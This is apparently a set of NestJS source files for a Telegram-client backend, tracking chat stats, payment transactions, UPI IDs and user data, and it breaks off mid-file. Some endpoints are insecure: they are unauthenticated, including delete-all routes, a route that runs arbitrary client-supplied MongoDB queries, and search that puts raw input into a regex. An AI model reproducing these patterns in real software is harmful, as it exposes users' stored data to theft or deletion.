@ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { Stat2Service } from './stat2.service';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\n\n@ApiTags('stats2')\n@Controller('stats2')\nexport class Stat2Controller {\n  constructor(private readonly statService: Stat2Service) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Stat2Service } from './stat2.service';\nimport { Stat2Controller } from './stat2.controller';\nimport { StatSchema } from './stat2.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        initModule,\n        MongooseModule.forFeature([{ name: \"Stats2Module\", collection: \"stats2\", schema: StatSchema }])],\n    controllers: [Stat2Controller],\n    providers: [Stat2Service],\n    exports: [Stat2Service]\n})\nexport class Stat2Module { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type Stat2Document = Stat2 & Document;\n\n@Schema()\nexport class Stat2 {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat2);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\nimport { Stat2, Stat2Document } from './stat2.schema';\n\n@Injectable()\nexport class Stat2Service {\n  constructor(@InjectModel(\"Stats2Module\") private statModel: Model<Stat2Document>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat2> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat2> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat2> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async findAll(): Promise<Stat2[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat2.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { StatService } from './stat.service';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\n\n@ApiTags('stats')\n@Controller('stats')\nexport class StatController {\n  constructor(private readonly statService: StatService) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { StatService } from './stat.service';\nimport { StatController } from './stat.controller';\nimport { StatSchema } from './stat.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        initModule,\n        MongooseModule.forFeature([{ name: \"StatsModule\", collection: \"stats\", schema: StatSchema }])],\n    controllers: [StatController],\n    providers: [StatService],\n    exports:[StatService]\n})\nexport class StatModule { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type StatDocument = Stat & Document;\n\n@Schema()\nexport class Stat {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\nimport { Stat, StatDocument } from './stat.schema';\n\n@Injectable()\nexport class StatService {\n  constructor(@InjectModel(\"StatsModule\") private statModel: Model<StatDocument>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findAll(): Promise<Stat[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateTransactionDto {\n  @ApiProperty({ description: 'Unique transaction ID (UTR).' })\n  transactionId: string;\n\n  @ApiProperty({ description: 'Amount involved in the transaction.' })\n  amount: number;\n\n  @ApiProperty({ description: 'Issue type reported by the user.' })\n  issue: string;\n  \n  @ApiProperty({ description: 'Description of issue reported by the user.' })\n  description: string;\n\n  @ApiProperty({ description: 'Refund method selected by the user.' })\n  refundMethod: string;\n\n  @ApiProperty({ description: 'User profile ID.' })\n  profile: string;\n\n  @ApiProperty({ description: 'User chat ID.' })\n  chatId: string;\n\n  @ApiProperty({ description: 'IP address of the user.' })\n  ip: string;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './create-transaction.dto';\n\nexport class UpdateTransactionDto extends PartialType(CreateTransactionDto) {}","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\n@Schema({ timestamps: true })\nexport class Transaction extends Document {\n  @Prop({ required: false })\n  transactionId: string;\n\n  @Prop({ required: false })\n  amount: number;\n\n  @Prop({ required: false })\n  issue: string;\n\n  @Prop({ required: false })\n  description: string;\n\n  @Prop()\n  refundMethod: string;\n\n  @Prop({ required: false })\n  profile: string;\n\n  @Prop({ required: false })\n  chatId: string;\n\n  @Prop({ required: false })\n  ipAddress: string;\n}\n\nexport const TransactionSchema = SchemaFactory.createForClass(Transaction);\n","import { Body, Controller, Get, Post, Put, Delete, Param, Query } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { TransactionService } from './transaction.service';\n\n@ApiTags('Transactions')\n@Controller('transactions')\nexport class TransactionController {\n  constructor(private readonly transactionService: TransactionService) {}\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new transaction' })\n  @ApiResponse({ status: 201, description: 'Transaction created successfully.' })\n  @ApiResponse({ status: 400, description: 'Invalid input.' })\n  async create(@Body() createTransactionDto: CreateTransactionDto) {\n    return this.transactionService.create(createTransactionDto);\n  }\n\n  @Get(':id')\n  @ApiOperation({ summary: 'Get transaction by ID' })\n  @ApiResponse({ status: 200, description: 'Transaction retrieved successfully.' })\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\n  async findOne(@Param('id') id: string) {\n    return this.transactionService.findOne(id);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all transactions or search transactions' })\n  @ApiResponse({ status: 200, description: 'Transactions retrieved successfully.' })\n  async findAll(\n    @Query('search') search?: string,\n    @Query('limit') limit?: number,\n    @Query('offset') offset?: number,\n  ) {\n    return this.transactionService.findAll(search, limit, offset);\n  }\n\n  @Put(':id')\n  @ApiOperation({ summary: 'Update a transaction by ID' })\n  @ApiResponse({ status: 200, description: 'Transaction updated successfully.' })\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\n  async update(\n    @Param('id') id: string,\n    @Body() updateTransactionDto: UpdateTransactionDto,\n  ) {\n    return this.transactionService.update(id, updateTransactionDto);\n  }\n\n  @Delete(':id')\n  @ApiOperation({ summary: 'Delete a transaction by ID' })\n  @ApiResponse({ status: 200, description: 'Transaction deleted successfully.' })\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\n  async delete(@Param('id') id: string) {\n    return this.transactionService.delete(id);\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { TransactionService } from './transaction.service';\nimport { TransactionController } from './transaction.controller';\nimport { Transaction, TransactionSchema } from './schemas/transaction.schema';\n\n@Module({\n  imports: [\n    MongooseModule.forFeature([\n      { name: Transaction.name, schema: TransactionSchema },\n    ]),\n  ],\n  controllers: [TransactionController],\n  providers: [TransactionService],\n  exports:[TransactionService]\n})\nexport class TransactionModule {}\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { Transaction } from './schemas/transaction.schema';\n\n@Injectable()\nexport class TransactionService {\n  constructor(\n    @InjectModel(Transaction.name) private readonly transactionModel: Model<Transaction>,\n  ) {}\n\n  async create(createTransactionDto: CreateTransactionDto): Promise<Transaction> {\n    const newTransaction = new this.transactionModel(createTransactionDto);\n    return await newTransaction.save();\n  }\n\n  async findOne(id: string): Promise<Transaction> {\n    const transaction = await this.transactionModel.findById(id).exec();\n    if (!transaction) {\n      throw new NotFoundException('Transaction not found');\n    }\n    return transaction;\n  }\n\n  async findAll(\n    search?: string,\n    limit = 10,\n    offset = 0,\n  ): Promise<{ transactions: Transaction[]; total: number }> {\n    const query = search\n      ? {\n          $or: [\n            { transactionId: { $regex: search, $options: 'i' } },\n            { issue: { $regex: search, $options: 'i' } },\n            { profile: { $regex: search, $options: 'i' } },\n            { chatId: { $regex: search, $options: 'i' } },\n          ],\n        }\n      : {};\n\n    const transactions = await this.transactionModel\n      .find(query)\n      .skip(offset)\n      .limit(limit)\n      .exec();\n    const total = await this.transactionModel.countDocuments(query).exec();\n\n    return { transactions, total };\n  }\n\n  async update(id: string, updateTransactionDto: UpdateTransactionDto): Promise<Transaction> {\n    const updatedTransaction = await this.transactionModel\n      .findByIdAndUpdate(id, updateTransactionDto, { new: true })\n      .exec();\n    if (!updatedTransaction) {\n      throw new NotFoundException('Transaction not found');\n    }\n    return updatedTransaction;\n  }\n\n  async delete(id: string): Promise<Transaction> {\n    const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();\n    if (!deletedTransaction) {\n      throw new NotFoundException('Transaction not found');\n    }\n    return deletedTransaction;\n  }\n}\n","import { Controller, Get, Body, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { UpiIdService } from './upi-ids.service';\n\n@ApiTags('UPI Ids')\n@Controller('upi-ids')\nexport class UpiIdController {\n  constructor(private readonly UpiIdService: UpiIdService) { }\n\n  @Get()\n  @ApiOperation({ summary: 'Get Upi Ids' })\n  async findOne(): Promise<any> {\n    return this.UpiIdService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update Upi Ids' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateUpiIdsdto: any): Promise<any> {\n    return this.UpiIdService.update(updateUpiIdsdto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UpiIdService } from './upi-ids.service';\nimport { UpiIdController } from './upi-ids.controller';\nimport { UpiIdSchema } from './upi-ids.schema';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Global()\n@Module({\n  imports: [\n    UpiIdModule,\n    NpointModule,\n    MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: UpiIdSchema }]),\n  ],\n  providers: [UpiIdService],\n  controllers: [UpiIdController],\n  exports: [UpiIdService],\n})\nexport class UpiIdModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type UpiIdDocument = UpiId & Document;\n\n@Schema({\n  versionKey: false,\n  autoIndex: true,\n  timestamps: false,\n  toJSON: {\n    virtuals: false,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class UpiId { }\n\nexport const UpiIdSchema = SchemaFactory.createForClass(UpiId);\nUpiIdSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UpiId } from './upi-ids.schema';\nimport axios from 'axios';\nimport { areJsonsNotSame } from '../../utils';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class UpiIdService {\n    private upiIds = {}\n    constructor(@InjectModel('UpiIdModule') private UpiIdModel: Model<UpiId>,\n        private npointSerive: NpointService\n    ) {\n        this.findOne().then(() => {\n            setInterval(async () => {\n                await this.refreshUPIs();\n                await this.checkNpoint();\n            }, 5 * 60000);\n        });\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async refreshUPIs() {\n        console.log(\"Refreshing UPIs\");\n        const result = await this.UpiIdModel.findOne({}).lean().exec();\n        if (result) {\n            this.upiIds = result;\n        }\n    }\n\n    async checkNpoint() {\n        const upiIds = (await axios.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;\n        const existingUpiIds = await this.findOne();\n        if (areJsonsNotSame(upiIds, existingUpiIds)) {\n            await this.npointSerive.updateDocument(\"54baf762fd873c55c6b1\", existingUpiIds)\n        }\n    }\n\n    async findOne(): Promise<any> {\n        if (Object.keys(this.upiIds).length > 0) {\n            return this.upiIds;\n        }\n        const result = await this.UpiIdModel.findOne({}).lean().exec();\n        if (!result) return null;\n\n        this.upiIds = result;\n        console.log(\"Refreshed UPIs\");\n        return result;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.UpiIdModel.findOneAndUpdate(\n            {},\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true, lean: true }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`UpiIdModel not found`);\n        }\n\n        this.upiIds = updatedUser;\n        console.log(\"Refreshed UPIs\")\n        return updatedUser;\n    }\n\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateUserDataDto {\n    @ApiProperty({ example: '5787751360', description: 'Chat ID' })\n    chatId: string;\n\n    @ApiProperty({ example: 1, description: 'Total count' })\n    totalCount: number;\n\n    @ApiProperty({ example: 0, description: 'Picture count' })\n    picCount: number;\n\n    @ApiProperty({ example: 1718802722566, description: 'Last message timestamp' })\n    lastMsgTimeStamp: number;\n\n    @ApiProperty({ example: 1718802742567, description: 'Limit time' })\n    limitTime: number;\n\n    @ApiProperty({ example: 0, description: 'Paid count' })\n    paidCount: number;\n\n    @ApiProperty({ example: 0, description: 'Profile count' })\n    prfCount: number;\n\n    @ApiProperty({ example: 1, description: 'Can reply' })\n    canReply: number;\n\n    @ApiProperty({ example: 0, description: 'Pay amount' })\n    payAmount: number;\n\n    @ApiProperty({ example: 0, description: 'highestPayAmount' })\n    highestPayAmount: number;\n\n    @ApiProperty({ example: 0, description: 'cheatCount', default: 0 })\n    cheatCount: number;\n\n    @ApiProperty({ example: 0, description: 'callTime', default: 0 })\n    callTime: number;\n\n    @ApiProperty({ example: 'بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅', description: 'Username' })\n    username: string;\n\n    @ApiProperty({ example: '-7250939091939055173', description: 'Access hash' })\n    accessHash: string;\n\n    @ApiProperty({ example: true, description: 'Paid reply status' })\n    paidReply: boolean;\n\n    @ApiProperty({ example: false, description: 'Demo given status' })\n    demoGiven: boolean;\n\n    @ApiProperty({ example: false, description: 'Second show status' })\n    secondShow: boolean;\n\n    @ApiProperty({ example: 'sneha', description: 'Profile name' })\n    profile: string;\n\n    @ApiProperty({ example: false, description: 'Pics Sent status' })\n    picsSent: boolean;\n\n    @ApiProperty({ example: [], description: 'videos' })\n    videos: number[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\n\nexport class SearchDto {\n  @ApiPropertyOptional({ description: 'Total count', type: Number })\n  totalCount?: number;\n\n  @ApiPropertyOptional({ description: 'Picture count', type: Number })\n  picCount?: number;\n\n  @ApiPropertyOptional({ description: 'Last message timestamp', type: Number })\n  lastMsgTimeStamp?: number;\n\n  @ApiPropertyOptional({ description: 'Limit time', type: Number })\n  limitTime?: number;\n\n  @ApiPropertyOptional({ description: 'Paid count', type: Number })\n  paidCount?: number;\n\n  @ApiPropertyOptional({ description: 'Profile count', type: Number })\n  prfCount?: number;\n\n  @ApiPropertyOptional({ description: 'Can reply', type: Number })\n  canReply?: number;\n\n  @ApiPropertyOptional({ description: 'Pay amount', type: Number })\n  payAmount?: number;\n\n  @ApiPropertyOptional({ description: 'Username' })\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Access hash' })\n  accessHash?: string;\n\n  @ApiPropertyOptional({ description: 'Paid reply status', type: Boolean })\n  paidReply?: boolean;\n\n  @ApiPropertyOptional({ description: 'Demo given status', type: Boolean })\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Second show status', type: Boolean })\n  secondShow?: boolean;\n\n  @ApiPropertyOptional({ description: 'Profile name' })\n  @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n  profile?: string;\n\n  @ApiPropertyOptional({ description: 'Chat ID' })\n  chatId?: string;\n\n  @ApiPropertyOptional({ description: 'Pics Sent status' })\n  picsSent?: boolean;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateUserDataDto } from './create-user-data.dto';\n\nexport class UpdateUserDataDto extends PartialType(CreateUserDataDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type UserDataDocument = UserData & Document;\n\n@Schema({\n    collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class UserData {\n    @Prop({ required: true })\n    chatId: string;\n\n    @Prop({ required: true })\n    totalCount: number;\n\n    @Prop({ required: true })\n    picCount: number;\n\n    @Prop({ required: true })\n    lastMsgTimeStamp: number;\n\n    @Prop({ required: true })\n    limitTime: number;\n\n    @Prop({ required: true })\n    paidCount: number;\n\n    @Prop({ required: true })\n    prfCount: number;\n\n    @Prop({ required: true })\n    canReply: number;\n\n    @Prop({ required: true })\n    payAmount: number;\n\n    @Prop({ required: true })\n    username: string;\n\n    @Prop({ required: true })\n    accessHash: string;\n\n    @Prop({ required: true })\n    paidReply: boolean;\n\n    @Prop({ required: true })\n    demoGiven: boolean;\n\n    @Prop({ required: true })\n    secondShow: boolean;\n\n    @Prop({ required: true, default: 0 })\n    fullShow: number;\n\n    @Prop({ required: true })\n    profile: string;\n\n    @Prop({ required: true })\n    picSent: boolean;\n\n    @Prop({ required: true })\n    highestPayAmount: number;\n\n    @Prop({ required: true })\n    cheatCount: number;\n\n    @Prop({ required: true })\n    callTime: number;\n\n    @Prop({ required: false, default:[] })\n    videos: number[];\n}\n\nexport const UserDataSchema = SchemaFactory.createForClass(UserData);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery } from '@nestjs/swagger';\nimport { UserDataService } from './user-data.service';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UserData } from './schemas/user-data.schema';\nimport { SearchDto } from './dto/search-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\n\n@ApiTags('UserData of TG clients')\n@Controller('userData')\nexport class UserDataController {\n  constructor(private readonly userDataService: UserDataService) {}\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createUserDataDto: CreateUserDataDto): Promise<UserData> {\n    return this.userDataService.create(createUserDataDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchDto): Promise<UserData[]> {\n    return this.userDataService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<UserData[]> {\n    return this.userDataService.findAll();\n  }\n\n\n  @Patch('updateAll/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async updateAll(@Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<any> {\n    return this.userDataService.updateAll(chatId, updateUserDataDto);\n  }\n\n\n  @Get(':profile/:chatId')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.findOne(profile, chatId);\n  }\n\n  @Patch(':profile/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('profile') profile: string, @Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n    return this.userDataService.update(profile, chatId, updateUserDataDto);\n  }\n\n  @Delete(':profile/:chatId')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.remove(profile, chatId);\n  }\n\n  @Get('clear-count')\n  clearCount(@Query('chatId') chatId?: string) {\n    return this.userDataService.clearCount(chatId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    try {\n      const { query, sort, limit, skip } = requestBody;\n      return await this.userDataService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;\n    }\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UserData, UserDataSchema } from './schemas/user-data.schema';\nimport { UserDataService } from './user-data.service';\nimport { UserDataController } from './user-data.controller';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: UserData.name, schema: UserDataSchema, collection: \"userData\" }])],\n  controllers: [UserDataController],\n  providers: [UserDataService],\n  exports: [UserDataService]\n})\nexport class UserDataModule { }\n","import { BadRequestException, Injectable, InternalServerErrorException, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UserData, UserDataDocument } from './schemas/user-data.schema';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\nimport { parseError } from '../../utils/parseError';\n\n@Injectable()\nexport class UserDataService {\n    private callCounts: Map<string, number> = new Map();\n    constructor(@InjectModel(UserData.name) private 